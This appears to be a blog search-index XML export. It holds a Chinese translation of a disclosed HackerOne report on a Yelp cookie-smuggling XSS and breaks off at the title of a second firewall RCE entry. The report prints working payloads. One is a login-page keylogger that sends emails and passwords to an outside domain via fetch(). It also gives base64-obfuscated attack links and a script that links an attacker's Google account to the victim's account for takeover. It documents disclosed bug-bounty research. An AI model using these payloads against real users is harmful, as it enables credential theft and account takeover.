<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hackerone漏洞报告-XSS ATO</title>
      <link href="/2023/08/18/Hackerone%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XSS%20ATO/"/>
      <url>/2023/08/18/Hackerone%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XSS%20ATO/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>漏洞名称：<strong>XSS ATO（通过登录键盘记录器，链接 Google 帐户）</strong><br>漏洞赏金：**<u>$5500 + $500</u>**<br>报告时间：世界标准时间 2023 年 6 月 2 日下午 2:40<br>提交报告者：lil_endian<br>报告编号  #2010530  已解决<br>报告已提交给 Yelp<br>已公开 2023年8月15日，协调世界时上午11:59<br>严重性：高（7 ~ 8.9）<br>弱点：跨站脚本（XSS）- 通用<br>耗时：无<br>CVE 编号：无<br>账户解锁：无</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>yelp.com 在返回给用户的HTML中反映了cookie“guvo”的内容。在某些情况下，该值没有得到适当转义，导致了XSS漏洞。这可以与另一个问题相结合，即后端未能正确解析用户提供的cookie，从而允许我们将guvo cookie伪装成一个名为yelpmainpaastacanary的cookie。可以通过在对*.yelp.com的任何请求中包含URL查询参数?canary&#x3D;[Cookie值]来设置yelpmainpaastacanary cookie。</p><p>此报告展示了如何将此cookie XSS与cookie解析问题链接起来，从而在受害者的浏览器中导致持久性XSS漏洞。为了展示影响，我将展示如何利用此漏洞在<a href="https://biz.yelp.com/login%E4%B8%8A%E6%B3%A8%E5%85%A5%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%EF%BC%8C%E4%BB%A5%E7%AA%83%E5%8F%96%E5%95%86%E4%B8%9A%E8%B4%A6%E6%88%B7%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/%E5%AF%86%E7%A0%81%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%B0%86%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84Google%E8%B4%A6%E6%88%B7%E4%B8%8E%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84Yelp%E8%B4%A6%E6%88%B7%E5%85%B3%E8%81%94%E8%B5%B7%E6%9D%A5%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E2%80%9C%E4%BD%BF%E7%94%A8Google%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E2%80%9D%E8%AE%BF%E9%97%AE%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E8%B4%A6%E6%88%B7%E3%80%82">https://biz.yelp.com/login上注入键盘记录器，以窃取商业账户的电子邮件/密码，以及如何将攻击者的Google账户与受害者的Yelp账户关联起来，并通过“使用Google账户登录”访问受害者的账户。</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><h3 id="通过”guvo”-cookie-进行的XSS攻击"><a href="#通过”guvo”-cookie-进行的XSS攻击" class="headerlink" title="通过”guvo” cookie 进行的XSS攻击"></a>通过”guvo” cookie 进行的XSS攻击</h3><p>在一些页面上，cookie guvo 的值被反映（未转义）。最有趣的是在 <a href="http://www.yelp.com/">www.yelp.com</a> 的首页以及 <a href="https://biz.yelp.com/login">https://biz.yelp.com/login</a> 的登录页面上。未经转义的反射发生在 window.ySitRepParams 对象和 window.yelp.guv 属性中。可以通过在浏览器或Burp中将cookie添加到请求中，并观察响应来看到这一点：</p><p><a href="https://sm.ms/image/oGBnX72RHZ45Y3z" target="_blank"><img src="https://s2.loli.net/2023/08/18/oGBnX72RHZ45Y3z.png" ></a></p><p><a href="https://sm.ms/image/crAmblJXK68aQfi" target="_blank"><img src="https://s2.loli.net/2023/08/18/crAmblJXK68aQfi.png" ></a></p><h3 id="设置-“yelpmainpaastacanary”-cookie"><a href="#设置-“yelpmainpaastacanary”-cookie" class="headerlink" title="设置 “yelpmainpaastacanary” cookie"></a>设置 “yelpmainpaastacanary” cookie</h3><p>在 yelp.com 上有一个功能，通过在请求中添加查询参数 ?canary&#x3D;asdf，响应将包含一个 HTTP 头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax</span><br></pre></td></tr></table></figure><p>这为我们提供了一种将yelpmainpaastacanary cookie设置为我们想要的任何值的方法。但是我们需要一种控制 guvo cookie 的方式。事实证明，我们可以将 guvo cookie 偷偷藏在 yelpmainpaastacanary cookie 内部。</p><h3 id="损坏的-cookie-解析和-cookie-走私"><a href="#损坏的-cookie-解析和-cookie-走私" class="headerlink" title="损坏的 cookie 解析和 cookie 走私"></a>损坏的 cookie 解析和 cookie 走私</h3><p>Yelp 后端将通过空格而不是分号来解析用户的 cookie。通常，由浏览器发送的 cookie 将会以分号分隔，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: a=1; b=2;</span><br></pre></td></tr></table></figure><p>这应该被解析为一个名为 a 值为 “1 b&#x3D;2” 的 cookie，但 Yelp 将其解析为两个名为 a 和 b 的 cookie。我们可以滥用这一点，通过向以下地址发出请求，将 guvo cookie 偷偷藏在 yelpmainpaastacanary cookie 内：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/8f3IaLSleTHWvG9" target="_blank"><img src="https://s2.loli.net/2023/08/18/8f3IaLSleTHWvG9.png" ></a></p><p>这将设置 cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf guvo=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;; Domain=.yelp.com; Path=/; Secure; </span><br></pre></td></tr></table></figure><p>并导致我们的 XSS 载荷每次访问 <a href="http://www.yelp.com/">www.yelp.com</a> 的首页时都会触发：</p><p><a href="https://sm.ms/image/Kqa4enRGk8iVv7x" target="_blank"><img src="https://s2.loli.net/2023/08/18/Kqa4enRGk8iVv7x.png" ></a></p><p>作为额外的奖励，我们还可以注入一个 Max-Age: 99999999 属性，这样我们的 cookie 就不会过期，会一直存在于受害者的浏览器中，等待我们的 XSS 注入发生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf </span><br><span class="line">guvo=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;; </span><br><span class="line">Max-Age=99999999; </span><br><span class="line">Domain=.yelp.com; </span><br><span class="line">Path=/; Secure; </span><br><span class="line">SameSite=Lax</span><br></pre></td></tr></table></figure><h3 id="POCs"><a href="#POCs" class="headerlink" title="POCs"></a>POCs</h3><p>请注意：由于我位于丹麦，yelp.com 将会重定向到 yelp.dk。这些攻击在两个域上的工作方式完全相同。</p><h3 id="在-biz-yelp-com-x2F-login-上的键盘记录器"><a href="#在-biz-yelp-com-x2F-login-上的键盘记录器" class="headerlink" title="在 biz.yelp.com&#x2F;login 上的键盘记录器"></a>在 biz.yelp.com&#x2F;login 上的键盘记录器</h3><p>当用户输入或提交登录表单时，以下 JavaScript 片段将泄露 <a href="https://biz.yelp.com/login">https://biz.yelp.com/login</a> 上电子邮件和密码字段的内容。这些凭据将泄露到我拥有的域名 calc.sh：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  a = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;password&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">  b = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;email&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`https://calc.sh/?a=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(a.value)&#125;</span>&amp;b=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(b.value)&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a.<span class="property">form</span>.<span class="property">onclick</span>=f;</span><br><span class="line">  a.<span class="property">onchange</span>=f;</span><br><span class="line">  b.<span class="property">onchange</span>=f;</span><br><span class="line">  a.<span class="property">oninput</span>=f;</span><br><span class="line">  b.<span class="property">oninput</span>=f;</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>我们创建一个链接，用于设置 guvo cookie 以在登录页面上触发此有效负载。请参阅此 CyberChef 配方，了解其操作方法并轻松进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C&#x27;&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;$&#x27;%7D,&#x27;%5C&#x27;))//;Max-Age%3D99999999&#x27;,true,false,true,false)URL_Encode(true)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;https://yelp.com/?canary%3D&#x27;,true,false,true,false)&amp;input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ</span><br></pre></td></tr></table></figure><p>我们的最终链接如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999</span><br></pre></td></tr></table></figure><p>任何访问该链接的人都将安装我们的键盘记录器。下面是一个展示其工作过程的简短视频：</p><p>视频演示地址：<br><a href="https://github.com/Bealee008/Hackerone_video/blob/main/biz.yelp.com-keylogger-poc.mp4">https://github.com/Bealee008/Hackerone_video/blob/main/biz.yelp.com-keylogger-poc.mp4</a></p><h3 id="通过链接-Google-账户实现账户接管"><a href="#通过链接-Google-账户实现账户接管" class="headerlink" title="通过链接 Google 账户实现账户接管"></a>通过链接 Google 账户实现账户接管</h3><p>将 Google 账户链接到 Yelp 账户的请求是从 <a href="https://yelp.com/profile_sharing">https://yelp.com/profile_sharing</a> 发出的。在 Google 链接流程中的最终请求是一个 POST 请求，发送到 <a href="https://www.yelp.dk/google_connect/register%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%8C%85%E5%90%AB">https://www.yelp.dk/google_connect/register，其中包含</a> CSRF 令牌 csrftok 和一个令牌 id_token，该令牌将 Google 账户与 Yelp 账户关联起来。我们可以为我们自己的 Google 账户生成一个令牌，然后使用 XSS 将其链接到受害者的账户上。</p><p>要生成一个令牌，我们只需将 Google 账户链接到我们自己的 Yelp 账户，并在 Burp 中拦截最终请求：</p><p><a href="https://sm.ms/image/lCgMpJYGu1RkQHj" target="_blank"><img src="https://s2.loli.net/2023/08/18/lCgMpJYGu1RkQHj.png" ></a></p><p>现在我们有了用于 Google 账户 <a href="mailto:doodaduguc@gmail.com">doodaduguc@gmail.com</a> 的令牌，我们可以为受害者创建一个 XSS 载荷。在这段代码中，我们向 &#x2F;profile_sharing 发出请求，并使用正则表达式提取 csrf 令牌。然后，我们使用我们准备的 id_token 发出请求，将我们的 Google 账户链接到受害者的账户上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  a = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  a.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    rx = <span class="regexp">/&quot;GoogleConnect&quot;: &quot;([^&quot;]*)/</span>;</span><br><span class="line">    id_token = <span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg&quot;</span>;</span><br><span class="line">    b = rx.<span class="title function_">exec</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;https://www.yelp.dk/google_connect/register&quot;</span>, &#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;body&quot;</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&quot;id_token&quot;</span>: id_token, <span class="string">&quot;csrftok&quot;</span>: b[<span class="number">1</span>]&#125;)&#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">  a.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://www.yelp.dk/profile_sharing&#x27;</span>);</span><br><span class="line">  a.<span class="title function_">send</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>同样，我们使用这个 CyberChef 食谱来创建一个链接，感染受害者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C&#x27;&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;$&#x27;%7D,&#x27;%5C&#x27;))//;Max-Age%3D99999999&#x27;,true,false,true,false)URL_Encode(true)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;https://yelp.com/?canary%3D&#x27;,true,false,true,false)&amp;input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw</span><br></pre></td></tr></table></figure><p>最终的链接如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999</span><br></pre></td></tr></table></figure><p>这个视频展示了攻击过程。左侧是受害者，右侧是攻击者。受害者已经登录到他们的 Yelp 账户。然后，他退出登录，在某个时间点访问了我们恶意的链接。当受害者在以后的某个时间点再次登录他的 Yelp 账户时，我们的载荷触发，将我们的 Google 账户 <a href="mailto:doodaduguc@gmail.com">doodaduguc@gmail.com</a> 链接到了受害者的账户。攻击者现在可以使用 Google 账户登录，并进入受害者的账户。</p><p>视频演示地址：<br><a href="https://github.com/Bealee008/Hackerone_video/blob/main/google-link-ato-poc2.mp4">https://github.com/Bealee008/Hackerone_video/blob/main/google-link-ato-poc2.mp4</a></p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>这种攻击可以完全威胁到 Yelp.com 上的商业账户，并在普通账户上进行账户接管。由于 cookie 不会过期，受害者只需要在某个时间点访问我们的链接，当他们稍后尝试登录 yelp.com 时，就会受到威胁。这个链接可以通过 Yelp 论坛、评论或私信传播给其他用户，从而轻松地针对其他 Yelp 用户进行攻击。</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://hackerone.com/reports/2010530">https://hackerone.com/reports/2010530</a></p>]]></content>
      
      
      <categories>
          
          <category> Hackerone漏洞报告 - XSS ATO（通过登录键盘记录器，链接 Google 帐户） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝盾防火墙前台RCE</title>
      <link href="/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/"/>
      <url>/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/</url>
      
